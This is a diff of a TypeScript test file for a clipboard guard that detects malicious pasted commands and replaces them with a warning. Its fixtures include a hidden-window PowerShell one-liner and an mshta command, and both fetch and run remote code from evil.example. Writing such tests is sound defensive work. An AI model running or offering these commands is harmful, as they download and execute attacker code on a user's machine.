@@ -4,46 +4,22 @@ import { blockedText, handleClipboard, parseDuration } from "../src/guard.ts";
 
 function deps(over: Partial<Parameters<typeof handleClipboard>[1]> = {}) {
   const writes: string[] = [];
-  const notes: string[] = [];
-  return {
-    writes,
-    notes,
-    d: {
-      write: (t: string) => void writes.push(t),
-      app: () => "Google Chrome",
-      notify: (t: string, b: string) => void notes.push(`${t}: ${b}`),
-      paused: () => false,
-      dryRun: false,
-      ...over,
-    },
-  };
+  return { writes, d: { write: (t: string) => void writes.push(t), paused: () => false, dryRun: false, ...over } };
 }
 
-test("malicious clipboard is overwritten before the app lookup, and the user is notified", () => {
-  const order: string[] = [];
-  const { d, writes, notes } = deps({
-    write: (t: string) => void order.push("write:" + t.slice(0, 10)),
-    app: () => {
-      order.push("app");
-      return "Google Chrome";
-    },
-  });
+test("malicious clipboard is overwritten with an explanation", () => {
+  const { d, writes } = deps();
   const v = handleClipboard("powershell -w hidden -c \"iex(irm http://evil.example/x)\"", d);
   assert.equal(v?.rule, "powershell-hidden");
-  assert.equal(order.length, 2);
-  assert.match(order[0]!, /^write:/);
-  assert.equal(order[1], "app");
-  void writes;
-  assert.equal(v?.app, "Google Chrome");
-  assert.equal(notes.length, 1);
-  assert.match(notes[0]!, /Google Chrome/);
+  assert.equal(writes.length, 1);
+  assert.match(writes[0]!, /Baitline blocked/);
+  assert.match(writes[0]!, /hidden window/);
 });
 
 test("benign clipboard is untouched", () => {
-  const { d, writes, notes } = deps();
+  const { d, writes } = deps();
   assert.equal(handleClipboard("meeting moved to 3pm", d), null);
   assert.equal(writes.length, 0);
-  assert.equal(notes.length, 0);
 });
 
 test("paused guard lets the paste through", () => {
@@ -52,12 +28,10 @@ test("paused guard lets the paste through", () => {
   assert.equal(writes.length, 0);
 });
 
-test("dry run notifies but does not touch the clipboard", () => {
-  const { d, writes, notes } = deps({ dryRun: true });
-  const v = handleClipboard("mshta https://evil.example/a.hta", d);
-  assert.equal(v?.rule, "mshta-remote");
+test("dry run reports but does not touch the clipboard", () => {
+  const { d, writes } = deps({ dryRun: true });
+  assert.equal(handleClipboard("mshta https://evil.example/a.hta", d)?.rule, "mshta-remote");
   assert.equal(writes.length, 0);
-  assert.equal(notes.length, 1);
 });
 
 test("blocked text explains itself and how to override", () => {
